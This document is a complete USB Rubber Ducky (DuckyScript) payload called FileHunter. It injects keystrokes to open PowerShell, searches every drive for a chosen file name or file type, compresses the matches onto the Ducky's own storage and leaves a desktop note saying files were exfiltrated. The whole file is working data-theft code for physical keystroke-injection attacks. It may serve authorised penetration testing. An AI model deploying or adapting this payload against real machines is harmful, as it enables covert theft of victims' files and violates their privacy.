REM Title:         FileHunter
REM Description:   Crawls all drives of the target system for a specific file or file type, to then compress and exfiltrate them to the Ducky.
REM Author:        0i41E
REM Version:       1.0
REM Category:      Exfiltration
REM Attackmodes:   HID, Storage

ATTACKMODE HID STORAGE

REM kducky: stripped DETECT_READY extension (dynamic boot delay)
REM kducky: stripped DETECT_FINISHED extension (CapsLock signal)

REM Define the file name or type by using a wildcard i.e. *.pdf
DEFINE #FILENAME example.jpg
DEFINE #NAME Ducky

REM kducky: initial DELAY 1000 reduced to 500
DELAY 500
GUI r
DELAY 500
STRINGLN powershell -nop -noni
REM You may want to add Windows_Elevated_Execution, if you want full access to all drives and directories
DELAY 2000
REM kducky: converted STRINGLN_POWERSHELL to individual STRINGLN statements
STRINGLN $out = ((gwmi win32_volume -f 'label=''#NAME''').Name)+"out.zip"
STRINGLN $dir = [System.IO.Path]::GetDirectoryName($out)
STRINGLN if (-not (Test-Path $dir)) {
STRINGLN     New-Item -ItemType Directory -Path $dir
STRINGLN }
STRINGLN $store = "$env:TEMP\Found"
STRINGLN if (Test-Path $store) {
STRINGLN     Remove-Item -Recurse -Force $store
STRINGLN }
STRINGLN New-Item -ItemType Directory -Path $store | Out-Null
STRINGLN Get-PSDrive -PSProvider FileSystem | ForEach-Object {
STRINGLN     $drive = $_.Root
STRINGLN     try {
STRINGLN         Get-ChildItem -Path $drive -Recurse -Filter "#FILENAME" -ErrorAction SilentlyContinue |
STRINGLN         ForEach-Object {
STRINGLN             $dest = Join-Path -Path $store -ChildPath $_.Name
STRINGLN             Copy-Item -Path $_.FullName -Destination $dest -Force
STRINGLN         }
STRINGLN     } catch {
STRINGLN         Write-Host "Error: drive ${drive}: $_" -ForegroundColor Red
STRINGLN     }
STRINGLN }
STRINGLN if (Test-Path $out) {
STRINGLN     Remove-Item -Force $out
STRINGLN }
STRINGLN Write-Host -ForegroundColor Yellow "Saving files to Ducky. This may take a while..."
STRINGLN Compress-Archive -Path "$store\*" -DestinationPath $out
STRINGLN Remove-Item -Recurse -Force $store; echo "Certain of your Files where exfiltrated, using a Rubber Ducky (Identified as #NAME)" > $env:HOMEPATH\Desktop\fyi.txt
STRINGLN ;(New-Object -ComObject wscript.shell).SendKeys('{CAPSLOCK}');ExIt
DELAY 150
ENTER
DELAY 250
WAIT_FOR_CAPS_ON
DELAY 250
REM kducky: stripped Detect_Finished() call (extension removed)